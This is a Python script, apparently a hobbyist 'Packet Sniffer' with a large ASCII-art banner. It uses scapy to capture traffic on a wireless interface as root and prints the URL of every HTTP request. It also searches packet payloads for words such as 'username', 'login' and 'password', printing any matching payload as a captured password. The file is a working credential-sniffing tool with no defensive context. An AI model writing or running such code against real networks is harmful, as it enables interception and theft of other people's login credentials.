import scapy.all as scapy
from scapy.layers import http
import os
print('''                                                                                                                                                                                                                                           

                                                                                                                                                                                                                                         
PPPPPPPPPPPPPPPPP                                      kkkkkkkk                                     tttt             SSSSSSSSSSSSSSS                   iiii     ffffffffffffffff    ffffffffffffffff                                      
P::::::::::::::::P                                     k::::::k                                  ttt:::t           SS:::::::::::::::S                 i::::i   f::::::::::::::::f  f::::::::::::::::f                                     
P::::::PPPPPP:::::P                                    k::::::k                                  t:::::t          S:::::SSSSSS::::::S                  iiii   f::::::::::::::::::ff::::::::::::::::::f                                    
PP:::::P     P:::::P                                   k::::::k                                  t:::::t          S:::::S     SSSSSSS                         f::::::fffffff:::::ff::::::fffffff:::::f                                    
  P::::P     P:::::Paaaaaaaaaaaaa      cccccccccccccccc k:::::k    kkkkkkk eeeeeeeeeeee    ttttttt:::::ttttttt    S:::::S          nnnn  nnnnnnnn    iiiiiii  f:::::f       fffffff:::::f       ffffffeeeeeeeeeeee    rrrrr   rrrrrrrrr   
  P::::P     P:::::Pa::::::::::::a   cc:::::::::::::::c k:::::k   k:::::kee::::::::::::ee  t:::::::::::::::::t    S:::::S          n:::nn::::::::nn  i:::::i  f:::::f             f:::::f           ee::::::::::::ee  r::::rrr:::::::::r  
  P::::PPPPPP:::::P aaaaaaaaa:::::a c:::::::::::::::::c k:::::k  k:::::ke::::::eeeee:::::eet:::::::::::::::::t     S::::SSSS       n::::::::::::::nn  i::::i f:::::::ffffff      f:::::::ffffff    e::::::eeeee:::::eer:::::::::::::::::r 
  P:::::::::::::PP           a::::ac:::::::cccccc:::::c k:::::k k:::::ke::::::e     e:::::etttttt:::::::tttttt      SS::::::SSSSS  nn:::::::::::::::n i::::i f::::::::::::f      f::::::::::::f   e::::::e     e:::::err::::::rrrrr::::::r
  P::::PPPPPPPPP      aaaaaaa:::::ac::::::c     ccccccc k::::::k:::::k e:::::::eeeee::::::e      t:::::t              SSS::::::::SS  n:::::nnnn:::::n i::::i f::::::::::::f      f::::::::::::f   e:::::::eeeee::::::e r:::::r     r:::::r
  P::::P            aa::::::::::::ac:::::c              k:::::::::::k  e:::::::::::::::::e       t:::::t                 SSSSSS::::S n::::n    n::::n i::::i f:::::::ffffff      f:::::::ffffff   e:::::::::::::::::e  r:::::r     rrrrrrr
  P::::P           a::::aaaa::::::ac:::::c              k:::::::::::k  e::::::eeeeeeeeeee        t:::::t                      S:::::Sn::::n    n::::n i::::i  f:::::f             f:::::f         e::::::eeeeeeeeeee   r:::::r            
  P::::P          a::::a    a:::::ac::::::c     ccccccc k::::::k:::::k e:::::::e                 t:::::t    tttttt            S:::::Sn::::n    n::::n i::::i  f:::::f             f:::::f         e:::::::e            r:::::r            
PP::::::PP        a::::a    a:::::ac:::::::cccccc:::::ck::::::k k:::::ke::::::::e                t::::::tttt:::::tSSSSSSS     S:::::Sn::::n    n::::ni::::::if:::::::f           f:::::::f        e::::::::e           r:::::r            
P::::::::P        a:::::aaaa::::::a c:::::::::::::::::ck::::::k  k:::::ke::::::::eeeeeeee        tt::::::::::::::tS::::::SSSSSS:::::Sn::::n    n::::ni::::::if:::::::f           f:::::::f         e::::::::eeeeeeee   r:::::r            
P::::::::P         a::::::::::aa:::a cc:::::::::::::::ck::::::k   k:::::kee:::::::::::::e          tt:::::::::::ttS:::::::::::::::SS n::::n    n::::ni::::::if:::::::f           f:::::::f          ee:::::::::::::e   r:::::r            
PPPPPPPPPP          aaaaaaaaaa  aaaa   cccccccccccccccckkkkkkkk    kkkkkkk eeeeeeeeeeeeee            ttttttttttt   SSSSSSSSSSSSSSS   nnnnnn    nnnnnniiiiiiiifffffffff           fffffffff            eeeeeeeeeeeeee   rrrrrrr            
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
 ''')

print("...***...***...***...Listening...***...***...***...\n\n")
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=print_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def user_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["email", "username", "user", "login", "password", "pass"]
        keywords = [i.encode() for i in keywords]
        for i in keywords:
            if i in load:
                return load

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("Link >> " + str(url))

        password = user_info(packet)
        if password is not None:
            print("Password >> " + str(password))

if os.geteuid() != 0:
    print("This script needs root privileges. Please run with sudo.")
else:
    interface = "wlan0"

    sniff(interface)
